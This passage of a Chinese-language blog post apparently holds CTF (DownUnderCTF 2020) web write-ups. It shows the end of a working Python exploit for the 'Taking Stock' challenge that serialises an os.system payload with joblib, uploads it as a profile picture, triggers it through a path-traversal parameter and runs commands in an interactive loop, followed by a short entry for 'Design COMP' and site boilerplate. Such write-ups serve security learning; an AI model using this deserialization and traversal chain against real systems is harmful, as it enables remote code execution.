class="number">-1</span>].replace(<span class="string">f&#x27;<span class="subst">&#123;uid&#125;</span>.png&#x27;</span>, <span class="string">&#x27;&#x27;</span>).rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="comment"># print(remote_path)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_payload</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    payload = <span class="string">f&#x27;<span class="subst">&#123;cmd&#125;</span> &gt; <span class="subst">&#123;remote_path&#125;</span>/<span class="subst">&#123;uid&#125;</span>.png&#x27;</span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (os.system, (payload,))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Model()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="comment"># 将 payload 序列化后写入文件。</span></span><br><span class="line">    tmpfile = io.BytesIO()</span><br><span class="line">    joblib.dump(make_payload(cmd), tmpfile)</span><br><span class="line">    tmpfile.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># session 上传文件</span></span><br><span class="line">    resp = session.post(</span><br><span class="line">        url=<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/profile-picture&#x27;</span>,</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&#x27;img&#x27;</span>: (<span class="string">&#x27;1.png&#x27;</span>, tmpfile)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 定位问题的位置</span></span><br><span class="line">    <span class="keyword">assert</span> resp.ok</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使运行文件中序列化的命令</span></span><br><span class="line">    resp = session.post(</span><br><span class="line">        url=<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/predict&#x27;</span>,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;stock&#x27;</span>: <span class="string">&#x27;../&#x27;</span> * <span class="number">16</span> + <span class="string">f&#x27;<span class="subst">&#123;remote_path&#125;</span>/<span class="subst">&#123;uid&#125;</span>.png&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;prices&#x27;</span>: <span class="string">&#x27;1,2&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取命令执行的结果</span></span><br><span class="line">    resp = session.get(<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="subst">&#123;uid&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input()</span><br><span class="line">    print(exec_cmd(cmd))</span><br><span class="line">    print(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Design-COMP"><a href="#Design-COMP" class="headerlink" title="Design COMP"></a>Design COMP</h1><p>题目链接：<a target="_blank" rel="noopener" href="https://chal.duc.tf:30105/">https://chal.duc.tf:30105/</a></p>
+<p>Come join our homepage design competition and test out your CSS skills!<br>Snippet of admin code: <a target="_blank" rel="noopener" href="https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da">https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da</a></p>
+<p>题解链接：<a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/30/%E8%A7%A3%E5%86%B3%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0%E7%B2%98%E8%B4%B4%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/" rel="prev" title="解决印象笔记粘贴代码缩进混乱的问题">
+      <i class="fa fa-chevron-left"></i> 解决印象笔记粘贴代码缩进混乱的问题
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-Badmin%EF%BC%88DNS%E9%85%8D%E7%BD%AE%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Web Badmin（DNS配置）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Robotsss%EF%BC%88SSTI%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">Robotsss（SSTI）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cookie-Clicker%EF%BC%88%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">Cookie Clicker（逻辑漏洞）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CicleSpace%EF%BC%88SQL%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">CicleSpace（SQL注入）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Taking-Stock%EF%BC%88Python%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">Taking Stock（Python序列化）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Design-COMP"><span class="nav-number">6.</span> <span class="nav-text">Design COMP</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">slug01sh</p>
+  <div class="site-description" itemprop="description">欢迎大家发表自己的见解与评价</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">slug01sh</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
